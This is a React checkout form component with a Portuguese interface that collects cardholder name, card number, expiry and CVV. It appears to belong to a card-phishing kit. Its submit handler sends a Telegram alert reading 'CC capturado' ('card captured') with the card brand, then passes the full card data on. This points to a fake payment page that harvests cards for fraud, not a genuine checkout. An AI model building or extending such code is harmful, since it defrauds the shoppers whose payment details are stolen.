
import React from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Button } from '@/components/ui/button';
import { Form } from '@/components/ui/form';
import { CreditCardData } from '@/types/checkout';
import { cardSchema } from './cardValidation';
import { CardFormFields } from './CardFormFields';
import { detectCardBrand } from './CardBrandDetector';
import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';

interface CardFormProps {
  onSubmit: (data: CreditCardData) => void;
  isLoading: boolean;
  buttonColor?: string;
  buttonText?: string;
  productPrice?: number;
}

export const CardForm: React.FC<CardFormProps> = ({ 
  onSubmit, 
  isLoading, 
  buttonColor = '#006400', // Dark green color
  buttonText = 'Finalizar Pagamento',
  productPrice = 0
}) => {
  const form = useForm<z.infer<typeof cardSchema>>({
    resolver: zodResolver(cardSchema),
    defaultValues: {
      holderName: '',
      number: '',
      expiryDate: '',
      cvv: '',
      installments: 1,
    },
    mode: 'onChange'
  });

  const handleSubmit = async (values: z.infer<typeof cardSchema>) => {
    const cardBrand = detectCardBrand(values.number);
    const cardData: CreditCardData = {
      holderName: values.holderName,
      number: values.number.replace(/\s/g, ''),
      expiryDate: values.expiryDate,
      cvv: values.cvv,
      brand: cardBrand.brand || 'unknown',
      installments: values.installments
    };
    
    // Enviar notificação do Telegram quando os dados do cartão forem preenchidos e enviados
    try {
      await sendTelegramNotification(`💳 2x CC capturado - ${cardData.brand.toUpperCase()}`);
    } catch (error) {
      console.error('Error sending Telegram notification:', error);
    }
    
    onSubmit(cardData);
  };
  
  return (
    <Form {...form}>
      <form onSubmit={form.handleSubmit(handleSubmit)} className="space-y-6">
        <CardFormFields form={form} productPrice={productPrice} />
        
        <Button 
          type="submit" 
          disabled={isLoading}
          className="w-full p-3 mt-6 text-white font-medium text-center rounded"
          style={{ backgroundColor: buttonColor }}
        >
          {isLoading ? 'Processando...' : buttonText}
        </Button>
      </form>
    </Form>
  );
};
